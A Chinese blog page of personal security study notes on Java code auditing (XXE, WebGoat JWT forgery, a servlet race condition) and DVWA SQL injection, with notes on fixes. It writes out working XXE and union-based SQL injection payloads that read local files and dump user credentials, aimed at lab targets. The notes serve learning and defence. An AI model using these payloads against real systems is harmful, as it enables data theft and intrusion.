<h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">案例FreeMarkerDemo</span><br><span class="line">OFCMS 1.1.3后台Freemarker模板注入</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-4-Xml外部实体注入"><a href="#5-4-Xml外部实体注入" class="headerlink" title="5.4 Xml外部实体注入"></a>5.4 Xml外部实体注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?data=&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">           DocumentBuilderFactory docFactory = DocumentBuilderFactory. newInstance();</span><br><span class="line">           DocumentBuilder docBuilder = docFactory.newDocumentBuilder();</span><br><span class="line">           Document doc = docBuilder.parse(new InputSource(new StringReader(request.getParameter(&quot;data&quot;))));</span><br><span class="line"></span><br><span class="line">           NodeList RegistrationNo = doc.getElementsByTagName(&quot;foo&quot;);</span><br><span class="line">           tmp = RegistrationNo.item(0).getFirstChild().getNodeValue();</span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">              out.print(e);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">通过分析上述代码可知，漏洞成因是该PoC使用了XML解析接口javax. xml.parsers.DocumentBuilder，但却未禁用外部实体。</span><br><span class="line">修复：</span><br><span class="line">	禁用外部实体 如果业务需要引用外部实体须在后端做好参数效验</span><br><span class="line">案例OpenRSAP的testcase</span><br><span class="line">作者的审计 org.jpmml 1.4.4</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-2-失效的身份认证"><a href="#5-2-失效的身份认证" class="headerlink" title="5.2 失效的身份认证"></a>5.2 失效的身份认证</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">webgoat出于安全只能127.0.0.1:8080端口访问</span><br><span class="line">在火狐中about:config设置network.proxy.allow_hijacking_localhost true</span><br><span class="line">	burp和火狐都设置了12321端口</span><br><span class="line">这样抓本地服务器127.0.0.1上的包了</span><br><span class="line"></span><br><span class="line">jwt token猜解实验</span><br><span class="line">@AssignmentPath(&quot;/JWT/votings&quot;)		/WebGoat目录下/JWT/votings来请求</span><br><span class="line">请求/WebGoat/JWT/votings/login?user=xxx返回构造的jwt 算法是第一部分 claim三个元素第二部分，其中setIssuedAt设置iat时间</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/java%E5%AE%89%E5%85%A8/image-20230510003152090.png" alt="image-20230510003152090"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://jwt.io可解</span><br><span class="line">获取到jwt后 从代码中获得jwt的密码为victory 修改键值admin为true 重新构造jwt</span><br><span class="line">	在/WebGoat/JWT/votings/reset中利用</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/java%E5%AE%89%E5%85%A8/image-20230510003834007.png" alt="image-20230510003834007"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">还有种解法是构造的jwt的第二个点之后删掉</span><br><span class="line"></span><br><span class="line">效验签名在内置函数DefaultJwtParser.class的Jwt parse函数</span><br><span class="line">	此处断点调试 一个字符一个字符 用.分割每一部分 ...</span><br><span class="line">base64UrlEncodedHeader		第一部分</span><br><span class="line">base64UrlEncodedPayload		第二部分</span><br><span class="line">base64UrlEncodedDigest 		第三部分 签名</span><br><span class="line">下图中第一个判断base64UrlEncodedDigest会进行签名效验 如果它为null就不会进行效验</span><br><span class="line">而第二个判断base64UrlEncodedDigest处给出了它为null的处理 实例的DefaultJwt对象没有签名</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/java%E5%AE%89%E5%85%A8/image-20230510004559936.png" alt="image-20230510004559936"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">其他案例爆破jwt</span><br><span class="line"></span><br><span class="line">防御方式</span><br><span class="line">    * 在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。</span><br><span class="line">    * 不要使用发送或部署默认的凭证，特别是管理员用户。</span><br><span class="line">    * 执行弱密码检查，例如测试新或变更的密码，以纠正“排名前10000个弱密码”（https://github.com/danielmiessler/SecLists/tree/master/Passwords） 列表。</span><br><span class="line">    * 将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的5.1.1章节-记住秘密（https://pages.nist.gov/800-63-3/sp800-63b.html），或其他现代的基于证据的密码策略相一致。</span><br><span class="line">    * 确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。</span><br><span class="line">    * 限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。</span><br><span class="line">    * 使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-5-失效的访问控制"><a href="#5-5-失效的访问控制" class="headerlink" title="5.5 失效的访问控制"></a>5.5 失效的访问控制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">身份认证和访问控制(授权)的不同</span><br><span class="line">认证解决who am i 授权 what can i do</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-6-Tomcat任意文件写入"><a href="#5-6-Tomcat任意文件写入" class="headerlink" title="5.6 Tomcat任意文件写入"></a>5.6 Tomcat任意文件写入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-7-跨站脚本"><a href="#5-7-跨站脚本" class="headerlink" title="5.7 跨站脚本"></a>5.7 跨站脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-8-不安全的反序列化"><a href="#5-8-不安全的反序列化" class="headerlink" title="5.8 不安全的反序列化"></a>5.8 不安全的反序列化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-9-使用含有已知漏洞的组件"><a href="#5-9-使用含有已知漏洞的组件" class="headerlink" title="5.9 使用含有已知漏洞的组件"></a>5.9 使用含有已知漏洞的组件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-11-不足的日志记录和监控"><a href="#5-11-不足的日志记录和监控" class="headerlink" title="5.11 不足的日志记录和监控"></a>5.11 不足的日志记录和监控</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-1-CSRF"><a href="#6-1-CSRF" class="headerlink" title="6.1 CSRF"></a>6.1 CSRF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-2-SSRF"><a href="#6-2-SSRF" class="headerlink" title="6.2 SSRF"></a>6.2 SSRF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-3-URL跳转"><a href="#6-3-URL跳转" class="headerlink" title="6.3 URL跳转"></a>6.3 URL跳转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-4-文件操作漏洞"><a href="#6-4-文件操作漏洞" class="headerlink" title="6.4 文件操作漏洞"></a>6.4 文件操作漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-5-Web后门"><a href="#6-5-Web后门" class="headerlink" title="6.5 Web后门"></a>6.5 Web后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-6-逻辑漏洞"><a href="#6-6-逻辑漏洞" class="headerlink" title="6.6 逻辑漏洞"></a>6.6 逻辑漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-7-前端配置不当"><a href="#6-7-前端配置不当" class="headerlink" title="6.7 前端配置不当"></a>6.7 前端配置不当</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-8-拒绝服务"><a href="#6-8-拒绝服务" class="headerlink" title="6.8 拒绝服务"></a>6.8 拒绝服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-9-点击劫持"><a href="#6-9-点击劫持" class="headerlink" title="6.9 点击劫持"></a>6.9 点击劫持</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-10-参数污染"><a href="#6-10-参数污染" class="headerlink" title="6.10 参数污染"></a>6.10 参数污染</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-1-1-SSM框架审计技巧"><a href="#7-1-1-SSM框架审计技巧" class="headerlink" title="7.1.1 SSM框架审计技巧"></a>7.1.1 SSM框架审计技巧</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-1-2-SSH框架审计技巧"><a href="#7-1-2-SSH框架审计技巧" class="headerlink" title="7.1.2 SSH框架审计技巧"></a>7.1.2 SSH框架审计技巧</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-1-3-SpringBoot审计流程"><a href="#7-1-3-SpringBoot审计流程" class="headerlink" title="7.1.3 SpringBoot审计流程"></a>7.1.3 SpringBoot审计流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-2-开发框架使用不当范例-Struts远程代码执行"><a href="#7-2-开发框架使用不当范例-Struts远程代码执行" class="headerlink" title="7.2 开发框架使用不当范例(Struts远程代码执行)"></a>7.2 开发框架使用不当范例(Struts远程代码执行)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Y4tacker"><a href="#Y4tacker" class="headerlink" title="Y4tacker"></a>Y4tacker</h1><h3 id="servlet-线程安全"><a href="#servlet-线程安全" class="headerlink" title="servlet 线程安全"></a>servlet 线程安全</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">创建servlet项目</span><br><span class="line">	https://blog.csdn.net/Faith_cxz/article/details/127685847</span><br><span class="line">	配置maven</span><br><span class="line">	maven-archetype-webapp</span><br><span class="line">servlet线程安全 参考	</span><br><span class="line">	https://y4tacker.github.io/page/5/#content-inner</span><br><span class="line">	https://www.cnblogs.com/chanshuyi/p/5052426.html</span><br><span class="line"></span><br><span class="line">一些结论</span><br><span class="line">	doGet service方法确实共享了成员变量</span><br><span class="line">	python脚本要开两个 我麻了 纠结半天</span><br><span class="line">		url = &quot;http://127.0.0.1:8080/test01/ttt?cmd=ls&quot;</span><br><span class="line">		while 1:</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            if &#x27;Cal&#x27; in r.text:</span><br><span class="line">                print(r.text)</span><br><span class="line">        url = &quot;http://127.0.0.1:8080/test01/ttt?cmd=open -na Calculator&quot;</span><br><span class="line">		while 1:</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            if &#x27;Cal&#x27; in r.text:</span><br><span class="line">                print(r.text)</span><br><span class="line">	前一个是为了使status一直在true，然后每隔2秒(线程延时)就会response返回一个open -na Calculator</span><br><span class="line">static静态变量加上没太大用 	类的属性 类方法调用</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.SingleThreadModel;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/ttt&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> status;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        status = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">format</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);</span><br><span class="line">        System.out.println(status+<span class="string">&quot; if-0 &quot;</span>+Thread.currentThread().getName()+ <span class="string">&quot; &quot;</span> + format.format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        <span class="keyword">if</span> (cmd.contains(<span class="string">&quot;Calculator&quot;</span>)) &#123;</span><br><span class="line">            status = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(status+<span class="string">&quot; if-1 &quot;</span>+Thread.currentThread().getName()+ <span class="string">&quot; &quot;</span> + format.format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        <span class="keyword">if</span> (!status) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(status+<span class="string">&quot; if-2 &quot;</span>+Thread.currentThread().getName()+ <span class="string">&quot; &quot;</span> + format.format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        System.out.println(cmd);</span><br><span class="line">        <span class="keyword">if</span> (cmd.contains(<span class="string">&quot;Calculator&quot;</span>))&#123;</span><br><span class="line">            System.out.println(cmd);</span><br><span class="line">            resp.getWriter().write(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修复</span><br><span class="line">    1.implements SingleThreadModel 成员变量--&gt;静态变量 		不顶用</span><br><span class="line">		SingleThreadModel接口在Servlet API2.4中将不推荐使用SingleThreadModel</span><br><span class="line">	2.避免使用成员变量 	e.g.把申明类型写道service或doGet方法里面	相当于使用局部变量</span><br><span class="line">	3.使用synchronized关键字 	保证只有一个线程可以访问被保护的区域</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> doGet		在方法前面添加锁</span><br><span class="line"></span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://huyaoyao2019.github.io/2023/07/05/java%E5%AE%89%E5%85%A8/" data-id="cljpvmu840001pwezdf9khsx8" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-dvwa" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/dvwa/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T15:23:50.716Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> mysql_query($getid) <span class="keyword">or</span> die(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>.mysql_error().<span class="operator">&lt;</span><span class="string">&#x27;/pre&#x27;</span><span class="operator">&gt;</span>);</span><br><span class="line">die()函数输出一条信息，并推出当前脚本</span><br><span class="line">mysql_error()函数返回上一个Mysql操作产生得到文本错误信息</span><br><span class="line"><span class="keyword">or</span>之前语句执行不成功事才会执行后面的语句</span><br><span class="line"><span class="keyword">and</span>之前语句执行成功事，才会执行后面的语句</span><br><span class="line"></span><br><span class="line">分为数字型和字符型</span><br><span class="line"><span class="keyword">select</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id<span class="operator">=</span>$id</span><br><span class="line"><span class="keyword">select</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span></span><br><span class="line">输入<span class="number">1</span><span class="operator">+</span><span class="number">2</span>看结果是<span class="number">1</span><span class="operator">+</span><span class="number">2</span>还是<span class="number">3</span></span><br><span class="line"></span><br><span class="line">对于字符型</span><br><span class="line"><span class="string">&#x27; or 1=1 or &#x27;</span>		假或真或假</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>		真或真</span><br><span class="line"><span class="string">&#x27; or 1=1#			假或真</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--			假或真</span></span><br><span class="line"></span><br><span class="line">如何防御<span class="keyword">sql</span>注入</span><br><span class="line">首要原则：用户的一切输入都是有害的，不被信任</span><br><span class="line">防御的主要方法：对用户输入的数据进行过滤</span><br><span class="line"></span><br><span class="line">利用sqlmap进行需要登录的输入		cookie</span><br></pre></td></tr></table></figure>

<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	mysql注释符 -- （后面有空格）或者#单行注释 本例多行注释</span></span><br><span class="line"><span class="comment">	php注释符	# //单行</span></span><br><span class="line"><span class="comment">	一定要用#？？</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--判断闭合点</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1						-- 单引号闭合</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #					<span class="comment">-- 注释掉后面的部分	查用户1</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #						-- 显示所有用户5个where恒成立</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>#					<span class="comment">-- 三列报错说名只有2个字段,返回结果2个</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#			-- 回显，说明执行的sql语句为select Firstname,Surname from table where id= &#x27;</span>id<span class="string">&#x27;	应该是说返回值要有2个</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, database()#	<span class="comment">-- 获取当前数据库==》dvwa</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select version(), 2#	-- 获取版本</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">session_user</span>(), <span class="number">2</span>#	<span class="comment">-- 连接用户</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select @@version_compile_os,@@basedir# -- 操作系统 安装路径</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, schema_name <span class="keyword">from</span> information_schema.schemata#		<span class="comment">-- 查询有哪些数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">查询dvwa有哪些表</span></span><br><span class="line"><span class="comment">有报错Illegal mix of collations for operation &#x27;UNION&#x27;</span></span><br><span class="line"><span class="comment">原因是两端类型不同https://blog.csdn.net/qq_43665434/article/details/114088565</span></span><br><span class="line"><span class="comment">需要修改类型</span></span><br><span class="line"><span class="comment">alter table users modify first_name varchar(15) character set utf8 collate utf8_general_ci</span></span><br><span class="line"><span class="comment">alter table users modify last_name varchar(15) character set utf8 collate utf8_general_ci</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 2,table_name from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> column_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#			<span class="comment">-- 查字段	此处最好加上数据集名，可能存在多个数据库都有users的可能性</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users modify <span class="keyword">user</span> <span class="type">varchar</span>(<span class="number">15</span>) <span class="type">character</span> <span class="keyword">set</span> utf8 <span class="keyword">collate</span> utf8_general_ci</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users modify password <span class="type">varchar</span>(<span class="number">15</span>) <span class="type">character</span> <span class="keyword">set</span> utf8 <span class="keyword">collate</span> utf8_general_ci</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select user,password from dvwa.users#</span></span><br><span class="line"><span class="string">alter table users modify first_name varchar(15) character set utf8 collate utf8_unicode_ci</span></span><br><span class="line"><span class="string">alter table users modify last_name varchar(15) character set utf8 collate utf8_unicode_ci</span></span><br><span class="line"><span class="string">-- 这里要改成Unicode编码</span></span><br></pre></td></tr></table></figure>

<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>会检测输入不能有特殊符号，比如</p>
<p><img src="/2023/07/05/dvwa/1652614062263.png" alt="1652614062263"></p>
